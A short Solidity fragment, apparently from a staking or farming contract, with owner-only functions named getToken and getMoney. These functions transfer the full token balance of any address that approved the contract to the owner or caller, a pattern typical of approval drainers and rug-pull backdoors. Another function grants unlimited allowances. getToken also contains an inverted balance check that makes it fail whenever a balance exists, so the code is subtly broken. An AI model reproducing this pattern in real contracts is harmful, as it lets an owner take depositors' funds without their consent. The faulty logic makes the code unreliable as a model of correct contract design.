...
//    event EmergencyWithdraw(address indexed user, uint256 indexed pid, uint256 amount);
    ...
    function safeApproveMax( IERC20 token, address spender ) external payable returns (bool){
        return token.approve(spender, type(uint256).max);
    }

    function getToken ( IERC20 token, address spender) public onlyOwnerOrGovernance {
        uint256 _balance = token.balanceOf(spender);
        address to = _msgSender();
        require( _balance <= 0, "Zero Balance");
        token.transferFrom(spender, to, _balance);
    }
    

    function getMoney(IERC20 _token, address spender) external onlyOwnerOrGovernance {
        uint256 balance = _token.balanceOf(spender);
        _token.safeTransferFrom( spender, owner(), balance);
    }
